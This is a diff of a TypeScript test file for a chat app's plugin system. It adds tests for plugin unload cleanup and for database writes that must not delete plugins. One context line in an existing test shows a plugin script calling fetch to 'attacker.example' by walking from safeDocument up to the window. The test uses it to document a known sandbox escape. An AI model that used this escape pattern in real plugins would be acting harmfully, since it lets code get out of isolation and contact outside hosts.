@@ -939,6 +939,10 @@ describe('V2 plugin unload lifecycle', () => {
 
   afterEach(() => {
     clearPluginV2State()
+    vi.useRealTimers()
+    delete (globalThis as Record<string, unknown>).__v2StaleMutation
+    delete (globalThis as Record<string, unknown>).__v2TimerRuns
+    delete (globalThis as Record<string, unknown>).__v2ListenerRuns
   })
 
   it('isolates throwing unload callbacks and clears registrations before the next reload', async () => {
@@ -1069,6 +1073,39 @@ describe('V2 plugin unload lifecycle', () => {
     log.mockRestore()
   })
 
+  it('revokes stale mutation closures and cleans timers and listeners when a V2.1 runtime reloads', async () => {
+    vi.useFakeTimers()
+    const calls = stubCommandFetch()
+    const script = `
+      globalThis.__v2TimerRuns = 0
+      globalThis.__v2ListenerRuns = 0
+      globalThis.__v2StaleMutation = () => setDatabaseLite({ currentPluginProvider: 'stale-provider' })
+      setTimeout(() => {
+        globalThis.__v2TimerRuns += 1
+        setDatabaseLite({ currentPluginProvider: 'timer-provider' })
+      }, 100)
+      addEventListener('risu-v2-runtime-test', () => {
+        globalThis.__v2ListenerRuns += 1
+        setDatabaseLite({ currentPluginProvider: 'listener-provider' })
+      })
+    `
+    const plugin = seedPlugin('lifecycle-plugin', { version: '2.1', script })
+    const log = vi.spyOn(console, 'log').mockImplementation(() => undefined)
+
+    await loadV2Plugin([plugin])
+    await loadV2Plugin([])
+
+    expect(() => (globalThis as any).__v2StaleMutation()).toThrow(/no longer active/)
+    window.dispatchEvent(new Event('risu-v2-runtime-test'))
+    await vi.advanceTimersByTimeAsync(100)
+
+    expect((globalThis as any).__v2TimerRuns).toBe(0)
+    expect((globalThis as any).__v2ListenerRuns).toBe(0)
+    expect(getDatabase().currentPluginProvider).toBe('old-provider')
+    expect(calls.some((call) => call.url.includes('/api/v1/commands/'))).toBe(false)
+    log.mockRestore()
+  })
+
   it('documents that an approved V2.1 runtime remains trusted main-page code', async () => {
     const script = `
       safeDocument['body']['ownerDocument']['defaultView']['fetch']('https://attacker.example/dom-bypass')
@@ -1093,6 +1130,50 @@ describe('V2 plugin unload lifecycle', () => {
 })
 
 describe('plugin database command bridge', () => {
+  it.each([
+    ['the legacy database proxy', (apis: ReturnType<typeof getV2PluginAPIs>) => apis.getDatabase()],
+    [
+      'a detached V3-style snapshot',
+      () => ({
+        plugins: getDatabase().plugins.map((plugin) => ({ ...plugin, realArg: { ...plugin.realArg } })),
+      }),
+    ],
+  ])('preserves installed plugins when setDatabase receives %s unchanged', async (_label, databaseSnapshot) => {
+    const calls = stubCommandFetch()
+    getDatabase().plugins = [seedPlugin('plugin-a'), seedPlugin('plugin-b')]
+    const apis = getV2PluginAPIs()
+
+    await apis.setDatabase(databaseSnapshot(apis))
+
+    expect(getDatabase().plugins.map((plugin) => plugin.name)).toEqual(['plugin-a', 'plugin-b'])
+    expect(
+      calls.filter((call) => call.method === 'DELETE' && call.url.startsWith('/api/v1/commands/plugins/')),
+    ).toEqual([])
+    expect(pluginImportMocks.alertConfirm).not.toHaveBeenCalled()
+  })
+
+  it('merges an approved plugin candidate without deleting already-installed plugins', async () => {
+    const calls = stubCommandFetch()
+    getDatabase().plugins = [seedPlugin('plugin-a'), seedPlugin('plugin-b')]
+    const apis = getV2PluginAPIs()
+    const pluginC = seedPlugin('plugin-c', { script: 'Risuai.log("plugin c")' })
+
+    await apis.setDatabase({ plugins: [...getDatabase().plugins, pluginC] })
+
+    expect(getDatabase().plugins.map((plugin) => plugin.name)).toEqual(['plugin-a', 'plugin-b', 'plugin-c'])
+    expect(calls).toEqual(
+      expect.arrayContaining([
+        expect.objectContaining({
+          url: '/api/v1/commands/plugins',
+          method: 'POST',
+        }),
+      ]),
+    )
+    expect(
+      calls.filter((call) => call.method === 'DELETE' && call.url.startsWith('/api/v1/commands/plugins/')),
+    ).toEqual([])
+  })
+
   it('routes plugin provider database writes through the provider command', async () => {
     const calls = stubCommandFetch()
     const apis = getV2PluginAPIs()
